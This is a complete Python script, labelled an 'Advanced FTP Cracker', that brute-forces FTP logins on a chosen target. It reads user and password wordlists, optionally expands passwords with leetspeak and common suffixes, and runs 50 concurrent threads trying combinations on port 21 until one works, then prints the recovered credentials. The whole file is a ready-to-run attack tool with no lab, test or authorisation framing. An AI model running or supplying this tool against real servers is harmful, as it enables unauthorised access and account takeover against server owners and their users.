import socket
import argparse
import ftplib
from threading import Thread, Lock, Event
from queue import Queue

combo_queue = Queue()
result_lock = Lock()
stop_event = Event()

parser = argparse.ArgumentParser(description="Advanced FTP Cracker")
parser.add_argument("-t", "--target", required=True, type=str, help="Enter the target IP or domain")
parser.add_argument("-u", "--user", required=True, type=str, help="User or path to user wordlist")
parser.add_argument("-p", "--passwd", required=True, type=str, help="Path to password wordlist")
parser.add_argument("-m", "--mutate", action="store_true", help="Enable password mutation")

args = parser.parse_args()
host = args.target
user = args.user
passwd = args.passwd
mutant = args.mutate

def smart_mutate(base_word):
    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
    mutations = set([base_word, base_word.capitalize(), base_word.upper()])
    suffixes = ["123", "!", "2024", "@"]

    for word in list(mutations):
        for suffix in suffixes:
            mutations.add(word + suffix)

    for word in list(mutations):
        for orig, repl in leet_map.items():
            if orig in word:
                mutations.add(word.replace(orig, repl))

    return mutations

def load_lines(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return [path]  # If not a file, treat as single user/password

users = load_lines(user)
passwords = load_lines(passwd)

# Build combo queue
for user in users:
    if mutant:
        for base in passwords:
            for pw in smart_mutate(base):
                combo_queue.put((user, pw))
    else:
        for pw in passwords:
            combo_queue.put((user, pw))

success = None

def ftp_worker():
    global success
    while not combo_queue.empty() and not stop_event.is_set():
        user, password = combo_queue.get()
        try:
            with ftplib.FTP() as ftp:
                ftp.connect(host, 21, timeout=5)
                ftp.login(user, password)

                with result_lock:
                    print(f"✅ SUCCESS 🎉 {user} : {password}")
                    success = (user, password)
                    stop_event.set()

        except ftplib.error_perm:
            with result_lock:
                print(f"❌ FAIL    {user} : {password}")
        except Exception as e:
            with result_lock:
                print(f"⚠ ERROR    {user} : {password} --> {str(e)}")
        finally:
            combo_queue.task_done()

# Spawn threads
threads = []
for _ in range(50):  # 50 concurrent threads
    t = Thread(target=ftp_worker)
    t.daemon = True
    t.start()
    threads.append(t)

combo_queue.join()

print("\n=====================================================\n")
if success:
    print(f"✅ Final working credentials:\nUSER     : {success[0]}\nPASSWORD : {success[1]}")
else:
    print("❌ No working credentials found.")
